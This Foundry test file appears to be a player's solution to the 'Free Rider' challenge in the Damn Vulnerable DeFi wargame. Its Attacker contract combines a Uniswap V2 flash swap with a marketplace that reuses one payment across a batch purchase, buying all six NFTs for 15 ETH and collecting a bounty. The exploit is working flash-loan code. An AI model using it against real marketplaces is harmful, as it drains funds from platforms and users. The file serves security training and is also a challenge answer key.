// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {
    IUniswapV2Pair
} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {
    IUniswapV2Factory
} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {
    IUniswapV2Router02
} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {
    FreeRiderNFTMarketplace
} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {
    FreeRiderRecoveryManager
} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract Attacker {
    IUniswapV2Pair flashL;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    IUniswapV2Router02 uniswapV2Router;
    WETH weth;
    DamnValuableToken token;
    DamnValuableNFT nft;

    constructor(
        IUniswapV2Pair _flashL,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        IUniswapV2Router02 _uniswapV2Router,
        WETH _weth,
        DamnValuableNFT _nft,
        DamnValuableToken _token
    ) {
        flashL = _flashL;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        uniswapV2Router = _uniswapV2Router;
        weth = _weth;
        nft = _nft;
        token = _token;
    }
    function attackerStarter() external {
        flashL.swap(
            15 ether, //amount needed for one NFT = All nft with the exploit
            0,
            address(this),
            abi.encode("flash loan")
        );
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256,
        bytes calldata
    ) external {
        require(msg.sender == address(flashL), "not pair");
        require(sender == address(this), "not attacker");

        weth.withdraw(amount0);
        Exploitbuyfunction(amount0);
    }

    function Exploitbuyfunction(uint256 flashLoanAmount) internal {
        //due to buyer-checker not refreshing state after each buy,
        //we can buy all NFTs for the price of one

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            tokenIds[tokenId] = tokenId;
        }
        marketplace.buyMany{value: 15 ether}(tokenIds);

        //sending all NFT to recovery manager to get the bounty

        for (uint256 tokenId = 0; tokenId < 6; tokenId++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                tokenId,
                abi.encode(tx.origin)
            );
        }

        //repay flashloan
        uint256 amountToRepay = ((flashLoanAmount * 1000) / 997) + 1; //amount + fee
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(flashL), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(player, "Player");
        vm.label(recoveryManagerOwner, "RecoveryManagerOwner");
        vm.label(address(0), "AddressZero");
        vm.label(address(weth), "WETH");
        vm.label(address(token), "DamnValuableToken");
        vm.label(address(uniswapV2Factory), "UniswapV2Factory");
        vm.label(address(uniswapV2Router), "UniswapV2Router");
        vm.label(address(uniswapPair), "UniswapV2Pair");
        vm.label(address(marketplace), "FreeRiderNFTMarketplace");
        vm.label(address(nft), "DamnValuableNFT");
        vm.label(address(recoveryManager), "FreeRiderRecoveryManager");

        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "builds/uniswap/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
            player,
            address(nft),
            recoveryManagerOwner,
            BOUNTY
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(
            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
        );
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            uniswapPair,
            marketplace,
            recoveryManager,
            uniswapV2Router,
            weth,
            nft,
            token
        );

        StateslogBeforeAttack();

        vm.deal(address(attacker), PLAYER_INITIAL_ETH_BALANCE);

        //starting with flashloan to get required amount to buy one nft

        attacker.attackerStarter();

        StateslogAfterAttack();
    }

    function StateslogBeforeAttack() internal view {
        console.log("player balance before attack:          ", player.balance);
        console.log(
            "marketplace balance before attack:     ",
            address(marketplace).balance
        );
        console.log(
            "recovery manager balance before attack:",
            address(recoveryManager).balance
        );
    }

    function StateslogAfterAttack() internal view {
        console.log("player balance after attack:           ", player.balance);
        console.log(
            "marketplace balance after attack:      ",
            address(marketplace).balance
        );
        console.log(
            "recovery manager balance after attack: ",
            address(recoveryManager).balance
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(
                address(recoveryManager),
                recoveryManagerOwner,
                tokenId
            );
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}
